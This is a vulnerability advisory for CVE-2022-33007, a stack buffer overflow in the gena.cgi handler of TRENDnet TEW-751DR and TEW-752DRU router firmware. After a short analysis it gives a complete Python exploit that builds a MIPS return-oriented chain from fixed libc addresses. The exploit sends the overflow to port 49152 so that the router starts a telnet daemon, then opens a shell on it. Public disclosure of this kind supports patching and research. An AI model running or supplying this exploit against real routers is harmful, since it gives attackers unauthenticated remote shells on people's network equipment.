Vendor of the products:TRENDnet

Reported by: 　　　WangJincheng && FeiXincheng from X1cT34m

Affected products: TRENDnet TEW751DR <= v1.03 , TRENDnet TEW-752DRU <= v1.03

Vendor Homepage:  https://www.trendnet.com/

Vendor Advisory:  https://www.trendnet.com/support/support-detail.asp?prod=165_TEW-751DR , 
                  https://www.trendnet.com/support/support-detail.asp?prod=170_TEW-752DRU

CVE_ID:CVE-2022-33007

# summarize

The LAN-side Web-Configuration Interface has Stack-based Buffer Overflow vulnerability in the `TrendNet` Wi-Fi router firmware `TEW751DR` `TEW-752DRU` . In the `genacgi_main` function of the `cgibin` program, the `sprintf` method directly uses the service parameter from `/gena.cgi`. The attackers can construct a payload to carry out arbitrary code attacks.

# vulnerability description

There is a `stack overflow` vulnerability in the `genacgi_main` function.

![image-20220316191407126](https://github.com/fxc233/CVE/blob/main/img/1.png)

It calls the `sub_40EC1C` function.

![image-20220316191407126](https://github.com/fxc233/CVE/blob/main/img/2.png)

However, in the `sub_40EC1C` function, it calls the `sprintf` function from `a1` to `v23` without any security check, which causes the stack overflow.

![image-20220316191407126](https://github.com/fxc233/CVE/blob/main/img/3.png)


# poc

	# python3
	from pwn import *
	from socket import *
	from os import *
	from time import *
	context(os = 'linux', arch = 'mips')
	
	libc_base = 0x2aaf8000
	
	s = socket(AF_INET, SOCK_STREAM)
	
	cmd = b'telnetd -p 7777;'
	payload = b'a'*462
	payload += p32(libc_base + 0x53200 - 1) # s0  system_addr - 1
	payload += p32(libc_base + 0x169C4) # s1  addiu $s2, $sp, 0x18 (=> jalr $s0)
	payload += b'a'*4 # s2
	payload += p32(libc_base + 0x32A98) # ra  addiu $s0, 1 (=> jalr $s1)
	payload += b'a'*0x18 # padding
	payload += cmd
	
	msg = b"UNSUBSCRIBE /gena.cgi?service=" + payload + b" HTTP/1.1\r\n"
	msg += b"Host: localhost:49152\r\n"
	msg += b"SID: 1\r\n\r\n"
	
	s.connect((gethostbyname("192.168.10.1"), 49152))
	s.send(msg)
		
	sleep(1)
	system("telnet 192.168.10.1 7777")


![image-20220316191407126](https://github.com/fxc233/CVE/blob/main/img/shell.png?raw=true)
